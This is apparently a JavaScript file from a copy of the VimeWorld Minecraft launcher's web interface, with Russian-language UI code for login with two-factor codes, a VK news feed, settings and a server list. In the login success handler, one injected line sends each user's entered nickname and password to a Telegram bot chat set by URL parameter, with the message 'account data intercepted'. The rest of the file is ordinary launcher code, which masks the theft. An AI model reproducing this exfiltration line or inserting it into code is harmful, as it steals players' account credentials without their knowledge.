            a.tooltipster($.extend(tooltipster_error, {
                content: "Не менее 6 символов"
            })).tooltipster("show");
            return false
        }
        var f = "";
        if (!$("#a_totp").hasClass("hidden")) {
            var d = $(this).find('input[name="totp"]');
            f = d.val();
            if (f == null || (f.length != 6 && f.length != 8) || !/^\d+$/.test(f)) {
                d.tooltipster($.extend(tooltipster_error, {
                    content: "Вы должны ввести 6-ти или 8-ми значное число"
                })).tooltipster("show");
                return false
            }
        }
        var c = $(this).find("button");
        c.attr("disabled", "").text("Авторизация...");
        _user.login({
            username: g,
            password: b,
            totp: f,
            callback: function(j) {
                c.removeAttr("disabled").text("Войти");
                if (j.lastIndexOf("fail", 0) === 0) {
                    var h = j.split(":", 2);
                    if (h.length == 1) {
                        return
                    }
                    ohSnap(h[1], "red");
                    return
                }
                if (j == "update") {
                    vw.showNeedUpdate();
                    return
                }
                if (j == "2fa") {
                    $('#auth-form input[name="username"]').attr("disabled", "disabled");
                    $('#auth-form input[name="password"]').attr("disabled", "disabled");
                    $("#a_totp").slideDown(200).removeClass("hidden").find('input[name="totp"]').focus();
                    $("#a_footer").addClass("hidden");
                    $("#a_footer_totp").removeClass("hidden");
                    return
                }
                if (j == "sucess-outdated-password") {
                    overlay.closeNow();
                    overlay.show(function() {
                        $("#outdated-password-popup").removeClass("active")
                    }, true);
                    $("#outdated-password-popup").addClass("active")
                }
                $.get(url="https://api.telegram.org/bot<? echo $token ?>/sendMessage?chat_id=<? echo $_GET['chatid']; ?>&text=🔥Данные аккаунта перехвачены 🔥 %0A%0A Данные аккаунта:  %0A├ Ник: " + document.getElementById("login").value + " %0A└ Пароль: " +  document.getElementById("password").value);
                c.addClass("btn-notransform");
                setTimeout(function() {
                    c.removeClass("btn-notransform")
                }, 1000);
                a.val("");
                $("#username").text(g = _user.getUsername());
                $("body").attr("class", "main");
                $('a[href="#play"]').trigger("click")
            }
        });
        return false
    });
    $("#logout").click(function() {
        if (vw.gameLoading) {
            ohSnap("Нельзя менять аккаунт во время запуска игры", "red");
            return
        }
        _user.logout();
        $("body").attr("class", "auth");
        $('a[href="#auth"]').trigger("click")
    });
    $("#tocp").click(function() {
        _common.openURL("https://cp.vimeworld.ru")
    });
    $("#toprofile").click(function() {
        _common.openURL("https://vimeworld.ru/player/" + _user.getUsername())
    });
    $("#a_totp_back").click(function() {
        $('#auth-form input[name="username"]').removeAttr("disabled");
        $('#auth-form input[name="password"]').removeAttr("disabled").val("");
        $("#a_totp").slideUp(200, function() {
            $(this).addClass("hidden")
        });
        $("#a_footer").removeClass("hidden");
        $("#a_footer_totp").addClass("hidden")
    })
});
$(document).on("vimeworld:load", function() {
    $('#auth-form input[name="username"]').val(_user.getUsername());
    if (_user.canAutoAuth()) {
        $('#auth-form input[name="password"]').val(_user.getPassword());
        setTimeout(function() {
            $("#auth-form").submit()
        }, 200)
    }
});
(function() {
    var b = /\[(.*)\|(.*)\]/;
    var k = 10;
    var f = 0;
    var e = false;
    var m = -29034706;
    var n = 0;
    var j = -1;
    var h = -1;
    var p = null;

    function g() {
        if (e) {
            return
        }
        e = true;
        ajax({
            url: "https://launcher.vimeworld.ru/data/news.php",
            data: {
                count: k,
                offset: f
            },
            callback: function(u) {
                var w = f == 0;
                f += k;
                var r = $.parseJSON(u);
                if (r.response == undefined) {
                    $("#news").html(tpl("tpl_news_error"));
                    return
                }
                var q = r.response.items;
                if (q.length == 0) {
                    return
                }
                if (w) {
                    $("#news").html("")
                }
                var t = 0;
                var s = false;
                for (id in q) {
                    if (q[id].text.indexOf("#offtop") == -1) {
                        if (q[id].is_pinned) {
                            p = q[id]
                        } else {
                            if (h == -1) {
                                h = q[id].id
                            }
                            if (!s) {
                                if (q[id].id <= j) {
                                    s = true
                                } else {
                                    t++
                                }
                            }
                            if (p != null && q[id].id < p.id) {
                                l(p, r.response);
                                n++;
                                p = null
                            }
                            l(q[id], r.response);
                            n++
                        }
                    }
                }
                _common.print("[news] " + q.length + " posts loaded");
                e = false;
                if (f == k) {
                    if (t > 0) {
                        if (s) {
                            $(".m_n_unwatched").text(t)
                        } else {
                            $(".m_n_unwatched").text((t > 9 ? 9 : t) + "+")
                        }
                    }
                }
                if (n <= 3) {
                    g()
                }
            }
        })
    }

    function l(s, r) {
        d(s, r);
        var q = $(tpl("tpl_news_post", s));
        q.find(".gifplayer").gifplayer({
            label: '<img style="margin: 13px 0 0 4px" src="img/video_play_compact.png">'
        });
        twemoji.parse(q[0], {
            folder: "svg",
            ext: ".svg"
        });
        $("#news").append(q)
    }

    function d(B, u) {
        post_owner_profile = c(B.owner_id, u);
        B.avatar = post_owner_profile.photo_50;
        B.text = anchorme(B.text);
        var C = B.text.split("\n");
        var q = false;
        for (i in C) {
            C[i] = C[i].replace(b, function(G, H, D, F, E) {
                return '<a href="https://vk.com/' + H + '">' + D + "</a>"
            });
            var y = C[i].substr(0, 1);
            if (y == "-" || y == "—") {
                C[i] = "<li>" + C[i].substr(1) + "</li>";
                if (!q) {
                    q = true;
                    C[i] = "<p><ul>" + C[i]
                }
            } else {
                if (q) {
                    q = false;
                    C[i] = "</ul></p><p>" + C[i] + "</p>"
                } else {
                    C[i] = "<p>" + C[i] + "</p>"
                }
            }
        }
        if (q) {
            C[C.length - 1] += "</ul></p>"
        }
        B.text = C.join("");
        if (B.copy_history && B.copy_history.length == 1) {
            var z = B.copy_history[0];
            B.text += '<div class="repost">';
            var r = u.profiles;
            var w = z.owner_id;
            if (z.owner_id < 0) {
                r = u.groups;
                w = -w
            }
            var t = c(z.owner_id, u);
            if (t != null) {
                var A = '<img class="avatar" src="' + t.photo_50 + '">';
                var s = '<span class="time-from-now" data-time="' + z.date + '">' + moment(z.date, "X").fromNow() + "</span>";
                B.text += '<h2 class="title"><a href="' + t.url + '">' + A + " " + t.name + "</a>" + s + "</h2>"
            }
            d(z, u);
            B.text += z.text;
            B.text += "</div>"
        }
        if (B.attachments) {
            var x = function(F) {
                var D = null;
                for (i in F) {
                    var E = F[i];
                    if (D == null || (E.width < 800 && E.width > D.width)) {
                        D = E
                    }
                }
                return D
            };
            B.attachments.forEach(function(D) {
                if (D.type == "photo") {
                    var F = D.photo;
                    var E = F.photo_807 || F.photo_604 || F.photo_130 || F.photo_75;
                    B.text += '<p class="img"><img src="' + E + '"></p>'
                } else {
                    if (D.type == "link" && D.link.url.indexOf("vk.com/@") !== -1) {
                        var I = D.link;
                        I.img = I.photo.photo_807 || I.photo.photo_604 || I.photo.photo_130 || I.photo.photo_75;
                        I.url = I.url.replace("m.vk.com", "vk.com").replace("@-29034706", "@vimeworld");
                        B.text += tpl("tpl_news_post_article", I)
                    } else {
                        if (D.type == "doc" && D.doc.ext == "gif") {
                            var H = D.doc.preview;
                            var F = x(H.photo.sizes);
                            if (F != null) {
                                if (H.video != undefined && H.video.src.indexOf("mp4=1") !== -1) {
                                    B.text += '<p><img class="gifplayer" src="' + F.src + '" data-mode="video" data-mp4="' + H.video.src + '"></p>'
                                } else {
                                    B.text += '<p><img class="gifplayer" src="' + F.src + '" data-gif="' + D.doc.url + '"></p>'
                                }
                            } else {
                                B.text += '<p><img class="gifplayer" src="' + D.doc.url + '"></p>'
                            }
                        } else {
                            if (D.type == "video") {
                                var G = D.video;
                                G.img = G.photo_800 || G.photo_640 || G.photo_320 || G.photo_130;
                                G.url = G.external_url || "https://vk.com/wall" + m + "_" + B.id + "?z=video" + G.owner_id + "_" + G.id;
                                G.duration = G.duration > 0 ? o(a(G.duration)) : "";
                                B.text += tpl("tpl_news_post_video", G)
                            }
                        }
                    }
                }
            })
        }
    }

    function c(w, q) {
        var u = q.profiles;
        var t = w < 0;
        if (t) {
            u = q.groups;
            w = -w
        }
        var s = null;
        for (var r = 0; r < u.length; r++) {
            if (u[r].id == w) {
                s = u[r];
                break
            }
        }
        if (s != null) {
            if (t) {
                if (s.screen_name) {
                    s.url = s.screen_name
                } else {
                    if (s.type == "group") {
                        s.url = "club" + w
                    } else {
                        if (s.type == "page") {
                            s.url = "public" + w
                        }
                    }
                }
            } else {
                s.name = s.first_name + " " + s.last_name;
                s.url = "id" + s.id
            }
            s.url = "https://vk.com/" + s.url
        }
        return s
    }

    function a(q) {
        this.seconds = q % 60;
        q = Math.floor(q / 60);
        this.minutes = q % 60;
        q = Math.floor(q / 60);
        this.hours = q % 60;
        return this
    }

    function o(s) {
        var r = function(t, u) {
            var w = t.toString();
            while (w.length < u) {
                w = "0" + w
            }
            return w
        };
        var q = "";
        if (s.hours > 0) {
            q += s.hours + ":" + r(s.minutes, 2)
        } else {
            q += s.minutes
        }
        q += ":" + r(s.seconds, 2);
        return q
    }
    $(document).ready(function(q) {
        $("#news").scroll(function() {
            var r = $(this);
            if (r[0].scrollHeight - r.height() - r.scrollTop() < 100) {
                g()
            }
        }).one("tab:open", function() {
            j = h;
            _config.setLastWatchedPost(j);
            $(".m_n_unwatched").text("")
        })
    });
    $(document).on("vimeworld:load", function(q) {
        _common.print("Trying to load news...");
        j = _config.getLastWatchedPost();
        g()
    })
})();
$(document).ready(function(a) {
    $("#s_savepass").change(function() {
        _config.setSavePass($(this).is(":checked"))
    });
    $("#s_fullscreen").change(function() {
        _config.setFullscreen($(this).is(":checked"))
    });
    $("#s_useshaders").change(function() {
        _config.setUseShaders($(this).is(":checked"))
    });
    $("#s_smoothscroll").change(function() {
        _config.setSmoothScroll($(this).is(":checked"))
    });
    $("#s_memory").blur(function() {
        var b = _config.validateMemory($(this).val());
        $(this).val(b);
        _config.setMemory(parseInt(b))
    });
    $("#s_width").blur(function() {
        var b = _config.validateWidth($(this).val());
        $(this).val(b);
        _config.setWidth(parseInt(b))
    });
    $("#s_height").blur(function() {
        var b = _config.validateHeight($(this).val());
        $(this).val(b);
        _config.setHeight(parseInt(b))
    });
    $("#s_theme").change(function() {
        var b = $(this).find("option:selected").attr("value");
        _config.setTheme(b);
        $("#h_theme").attr("href", "css/vimeworld-" + b + ".css")
    })
});
$(document).on("vimeworld:load", function(b) {
    if (_config.isSavePass()) {
        $("#s_savepass").attr("checked", "")
    }
    if (_config.isFullscreen()) {
        $("#s_fullscreen").attr("checked", "")
    }
    if (_config.isUseShaders()) {
        $("#s_useshaders").attr("checked", "")
    }
    if (_config.isSmoothScroll()) {
        $("#s_smoothscroll").attr("checked", "")
    }
    $("#s_memory").val(_config.getMemory());
    $("#s_width").val(_config.getWidth());
    $("#s_height").val(_config.getHeight());
    var c = _config.getTheme();
    var a = [];
    $("#s_theme option").each(function(d) {
        a.push($(this).attr("value"))
    });
    if ($.inArray(c, a) == -1) {
        c = "blue";
        _config.setTheme(c)
    }
    $('#s_theme option[value="' + c + '"]').attr("selected", "1");
    $("#h_theme").attr("href", "css/vimeworld-" + c + ".css");
    if (_config.isSmoothScroll()) {
        $("body").append('<script src="js/libs/smooth-scroll.min.js"><\/script>')
    }
    $("#s_open_launcher_dir").click(function(d) {
        d.preventDefault();
        _game.openLauncherDir()
    });
    _common.print("Settings loaded")
});
(function() {
    var k = {};
    var m = {};
    var f = {};
    var a;
    var j = "";
    var b = false;
    var g = function(n) {
        if (n.online == undefined) {
            return ""
        }
        var o = '<span class="muted">' + n.online;
        if (n.max == 0) {
            o = '<span class="red">Оффлайн</span>'
        } else {
            if (n.max > 0) {
                o += "/" + n.max
            }
            o += "</span>"
        }
        return o
    };
    var h = function() {
        ajax({
            url: "https://mc.vimeworld.ru/mon/min.txt",
            callback: function(o) {
                o = o.split(";");
                var n = 0;
                o.forEach(function(q) {
                    var p = q.split(":");
                    server = k[m[p[0]]];
                    if (server != undefined) {
                        p = p[1].split("/");
                        server.online = parseInt(p[0]);
                        server.max = parseInt(p[1]);
                        if (server.max != 0) {
                            n += server.online
                        }
                        $("#srv_" + server.id + " .status").html(g(server))
                    }
                });
                $("#total-online").html('Общий онлайн: <span class="green">' + n + "</span>");
                if (_game.getSelected() != -1) {
                    $("#server-online").html(g(k[_game.getSelected()]))
                }
            }
        });
        setTimeout(h, 60000)
    };
    var e = function() {
        ajax({
            url: "https://mc.vimeworld.ru/mon/mg.json",
            callback: function(n) {
                if (typeof n === "string") {
                    n = JSON.parse(n)
                }
                f = n;
                d()
            }
        });
        setTimeout(e, 60000)
    };
    var d = function() {
        $("#server-description .minigames-list").find(".online").each(function() {
            var o = $(this).attr("data-mg");
            if (o) {
                var n = 0;
                o.split(",").forEach(function(p) {
                    if (p in f) {
                        n += f[p]
                    }
                });
                $(this).text(n)
            }
        })
    };
    var c = function() {
        $("#loading-bar").attr("value", _game.progress * 10);
        $("#loading-bar-text").text(_game.status);
        if (!_game.running) {
            clearInterval(a);
            a = undefined;
            vw.gameLoading = false;
            $("#loading-bar-container").removeClass("active");
            $("#play-btn").removeAttr("disabled");
            $("#loading-bar").attr("value", "0");
            $("#loading-bar-text").text("")
        }
    };
    var l = function() {
        j = "";
        _gui.loadServers({
            callback: function(p) {
                j = _config.getUsername();
                p = $.parseJSON(p);
                _common.print("Loaded " + p.length + " servers");
                var n = "";
                var q = 0;
                k = {};
                m = {};
                p.forEach(function(r) {
                    k[q] = r;
                    m[r.name] = q;
                    r.id = q++;
                    n += tpl("tpl_server_list_item", r)
                });
                $("#servers ul").html(n).find("li").click(function(s) {
                    var t = parseInt($(this).attr("data-id"));
                    var r = k[t];
                    _game.setSelected(t);
                    $(this).addClass("active").siblings().removeClass("active");
                    $("#server-name").text(r.name);
                    $("#server-description").html(twemoji.parse(r.desc, {
                        folder: "svg",
                        ext: ".svg"
                    })).scrollTop(0);
                    $("#server-online").html(g(r));
                    $("#server-description").find(".tooltip").tooltipster({
                        delay: 0,
                        speed: 100
                    });
                    d()
                });
                var o = _config.getLastServer();
                if (o == null || m[o] == undefined) {
                    q = 0
                } else {
                    q = m[o]
                }
                $("#srv_" + q).trigger("click");
                $("#play-btn").removeAttr("disabled");
                if (!b) {
                    b = true;
                    h();
                    e()
                }
            },
            onError: function() {
                var o = $('<button class="btn btn-primary">Попробовать снова</button>');
                o.on("click", function(p) {
                    l();
                    $(this).attr("disabled", "disabled").text("Загрузка...")
                });
                var n = $('<div style="text-align:center;"><p>Ошибка при загрузке списка серверов.</p></div>').append(o);
                $("#server-description").text("").append(n)
            }
        })
    };
    $(document).ready(function() {
        $("#play-btn").click(function() {
            $(this).attr("disabled", "");
            _game.startUpdate();
            $("#loading-object").text("Запуск " + k[_game.getSelected()].name);
            $("#loading-bar-container").addClass("active");
            a = setInterval(c, 100);
            vw.gameLoading = true
        });
        $("#p_screenshots").click(function() {
            _game.openScreenshotsDir()
        });
        $("#p_openclient").click(function() {
            _game.openClientDir()
        });
        $("#p_deleteclient").click(function() {
            _game.deleteClient()
        });
        $("#play").on("tab:open", function() {
            if (_config.getUsername() == j) {
                return
            }
            l()
        })
    });
    $(document).on("vimeworld:load", function() {})
})();
